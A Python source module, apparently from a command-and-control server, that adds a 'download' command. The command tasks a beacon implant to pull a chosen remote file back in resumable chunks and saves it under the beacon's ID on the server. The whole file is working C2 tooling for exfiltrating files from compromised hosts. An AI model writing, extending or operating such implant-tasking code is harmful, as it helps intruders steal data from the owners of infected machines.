"""download — 从 beacon 拉取文件（分块自动续传）:

download [<beacon_id>] <remote_path> [<local_path>]
  local_path 缺省时自动落盘到 server 的 downloads/<bid>_<文件名>
  (web 详情抽屉等入口不传 local,由命令默认生成——2026-09-04)
"""

import os
import re as _re

from server.task_queue import Task


def run(disp, args):
    if not args:
        return "[!] usage: download [<beacon_id>] <remote_path> [<local_path>]"
    bid, rest = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon (use <beacon_id> 或显式指定)"
    if not rest:
        return "[!] usage: download [<beacon_id>] <remote_path> [<local_path>]"
    remote = rest[0]
    local = rest[1] if len(rest) > 1 else ""
    if not local:
        base = getattr(disp.config, "base_dir", "") or os.getcwd()
        dl_dir = os.path.join(base, "downloads")
        try:
            os.makedirs(dl_dir, exist_ok=True)
        except OSError:
            dl_dir = os.getcwd()
        name = _re.sub(r"[^A-Za-z0-9._-]", "_",
                       os.path.basename(remote)) or "file"
        local = os.path.join(dl_dir, f"{bid}_{name}")
    try:
        task = disp.build_task("download", [remote, "0"])
    except ValueError as e:
        return f"[!] {e}"
    if task is None:
        return "[!] unknown module: download"
    task.result_processor = "download_parse"
    task.proc_arg = local
    r = disp.push_task(bid, task)
    return f"[+] 下载任务: {remote} → {local}\n{r}"
